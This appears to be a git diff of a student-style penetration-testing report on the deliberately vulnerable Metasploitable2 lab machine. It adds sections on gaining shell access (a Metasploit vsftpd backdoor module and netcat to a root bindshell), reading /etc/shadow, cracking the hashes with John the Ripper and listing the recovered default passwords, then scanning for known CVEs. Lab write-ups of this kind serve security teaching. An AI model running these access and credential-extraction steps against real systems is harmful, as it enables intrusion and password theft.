@@ -16,7 +16,7 @@ Identify as much information as possible about the target system including its I
 
 ---
  
-## 1.2 Network Discovery
+### 1.2 Network Discovery
  
 ### Tool Used
 `nmap` `ip a` – Host Discovery Scan
@@ -42,7 +42,7 @@ nmap -sn 192.168.56.0/24
 
 ---
 
-## 1.2 Port Scanning
+### 1.2 Port Scanning
 
 **Tool Used:** `nmap` – Full Port Scan with Version Detection
 
@@ -90,7 +90,7 @@ nmap -sV -sC -p- 192.168.56.103 -oN phase1_portscan.txt
 
 ---
 
-## 1.3 Service Enumeration
+### 1.3 Service Enumeration
 
 #### FTP – Port 21 (vsftpd 2.3.4)
 
@@ -111,7 +111,7 @@ nmap -sV -p 21 --script=ftp-anon,ftp-syst 192.168.56.103
 
 ---
 
-## SSH – Port 22 (OpenSSH 4.7p1)
+#### SSH – Port 22 (OpenSSH 4.7p1)
 
 **Command:**
 ```bash
@@ -128,7 +128,7 @@ nmap -p 22 --script=ssh-hostkey 192.168.56.103
 
 ---
 
-## SMB – Port 445 (Samba 3.0.20)
+#### SMB – Port 445 (Samba 3.0.20)
 
 **Command:**
 ```bash
@@ -150,7 +150,7 @@ nmap -p 445 --script=smb-os-discovery 192.168.56.103
 
 ---
 
-## HTTP – Port 80 (Apache 2.2.8)
+#### HTTP – Port 80 (Apache 2.2.8)
 
 **Command:**
 ```bash
@@ -167,7 +167,7 @@ nmap -p 80 --script=http-title,http-headers 192.168.56.103
 
 ---
 
-## 2.5 Web Enumeration
+### 2.5 Web Enumeration
  
 **Tool Used:** `dirb` v2.22
  
@@ -242,3 +242,199 @@ Assess the strength of passwords used on the Metasploitable2 system by extractin
 
 ---
 
+### 3.2 Hash Collection
+
+#### Step 1 – Gain Access to the System
+
+Using the vsftpd 2.3.4 backdoor or an SSH brute-force attack (from Phase 1), access the system:
+
+```bash
+# Using Metasploit vsftpd backdoor
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.103
+run
+```
+
+Or gain access via the open root shell on port 1524:
+```bash
+nc 192.168.56.103 1524
+```
+
+**Screenshot:** ![system access](screenshots/systemaccess.png)
+---
+
+#### Step 2 – Extract Password Hashes
+
+Once inside the system, extract the shadow file:
+
+```bash
+cat /etc/passwd
+cat /etc/shadow
+```
+
+Copy the hashes to your Kali machine and save as `hashes.txt`.
+
+**Screenshot:** ![etcshadow](screenshots/etcshadow.png)
+
+---
+
+#### Step 3 – Combine passwd and shadow
+
+```bash
+unshadow /etc/passwd /etc/shadow > combined.txt
+```
+
+---
+
+#### 3.3 Password Audit
+
+**Tool Used:** John the Ripper
+
+**Command:**
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
+```
+
+**View cracked passwords:**
+```bash
+john --show combined.txt
+```
+
+**Screenshot:** ![johntheriper](screenshots/johntheripercracking.png)
+
+---
+
+### 3.4 Password Risk Assessment
+
+| User     | UID  | Password Recovered | Password    | Strength | Risk     |
+|----------|------|--------------------|-------------|----------|----------|
+| sys      | 3    | Yes                | batman      | Weak     | High     |
+| klog     | 103  | Yes                | 123456789   | Weak     | High     |
+| msfadmin | 1000 | Yes                | msfadmin    | Weak     | Critical |
+| postgres | 108  | Yes                | postgres    | Weak     | Critical |
+| user     | 1001 | Yes                | user        | Weak     | Critical |
+| service  | 1002 | Yes                | service     | Weak     | Critical |
+| unknown  | -    | Not cracked        | -           | Unknown  | Pending  |
+
+**Total hashes loaded:** 7
+**Cracked:** 6
+**Remaining:** 1 (uncracked)
+
+**Screenshot:** ![crack password](screenshots/crackedpassword.png)
+
+---
+
+## 3.5 Phase 2 Deliverables - Password Assessment Report
+
+| Metric                       | Value                                                        |
+|------------------------------|--------------------------------------------------------------|
+| Total Hashes Loaded          | 7 (md5crypt format)                                          |
+| Accounts Cracked             | 6 (sys, klog, msfadmin, postgres, user, service)             |
+| Remaining Uncracked          | 1                                                            |
+| Weak Passwords Found         | 6 (batman, 123456789, msfadmin, postgres, user, service)     |
+| Default/Username as Password | Yes - msfadmin, postgres, user, service all use username as password |
+| Strong Passwords Found       | 0                                                            |
+| Hash Format                  | md5crypt / crypt(3) $1$ (MD5 256/256 AVX2)                  |
+
+**Security Recommendations:**
+- Enforce a strong password policy (minimum 12 characters, mixed case, numbers, symbols)
+- Disable default accounts or change default credentials immediately
+- Implement account lockout after 5 failed login attempts
+- Use password managers to generate and store unique credentials
+- Enable Multi-Factor Authentication (MFA) for all privileged accounts
+- Regularly audit `/etc/shadow` for weak or reused passwords
+
+---
+
+## 4. Phase 3 – Vulnerability Assessment
+
+### 4.1 Objective
+Identify and categorize vulnerabilities present on the Metasploitable2 system across all services discovered in Phase 1.
+
+---
+
+### 4.2 Service Review
+
+#### FTP – vsftpd 2.3.4
+
+**Command:**
+```bash
+nmap -p 21 --script=ftp-vsftpd-backdoor 192.168.56.103
+```
+
+**Findings:**
+- CVE-2011-2523: vsftpd 2.3.4 backdoor — a malicious version of vsftpd was distributed with a backdoor that opens a shell on port 6200 when `:)` is appended to the username during login.
+- Anonymous login enabled — any unauthenticated user can browse FTP files.
+
+**Screenshot:** ![ftp 21](screenshots/vsftpdvulnerabilityscan.png)
+
+
+---
+
+## SSH - OpenSSH 4.7p1
+
+**Findings:**
+- Version released in 2007 - over 17 years outdated.
+- No brute-force protection configured.
+- Weak passwords (as shown in Phase 2) make this trivially exploitable.
+
+---
+
+## Telnet - Port 23
+
+**Findings:**
+- Telnet transmits all data in **plaintext** including usernames and passwords.
+- Any attacker with network access can perform a man-in-the-middle attack and capture credentials.
+- Telnet should be completely disabled and replaced with SSH.
+
+---
+
+## Samba - Port 445 (SMB)
+
+**Command:**
+```bash
+nmap -p 445 --script=smb-vuln-ms08-067,smb-vuln-cve-2007-2447 192.168.56.103
+```
+
+**Findings:**
+- CVE-2007-2447: Samba usermap_script vulnerability - allows unauthenticated remote code execution by injecting shell metacharacters into the username field.
+- Samba version 3.0.20 is critically outdated.
+
+**Screenshot:** ![samba](screenshots/sambavulnerabilityscan.png)
+
+---
+
+#### distccd – Port 3632
+
+**Command:**
+```bash
+nmap -p 3632 --script=distcc-cve2004-2687 192.168.56.103
+```
+
+**Scan Output:**
+```
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-cve2004-2687:
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|     Disclosure date: 2002-02-01
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+**Findings:**
+- CVE-2004-2687 **confirmed VULNERABLE and Exploitable** by Nmap NSE script
+- CVSSv2 score: **9.3 HIGH** — arbitrary remote command execution
+- Attacker can execute commands as `daemon` user (uid=1, gid=1) without authentication
+- Vulnerability is due to weak service configuration — distccd accepts jobs from any host
+- Disclosed since 2002 — over 20 years unpatched on this system
+
+**Screenshot:** ![distccd](screenshots/distccdvulnerabilityscan.png)
+
+---
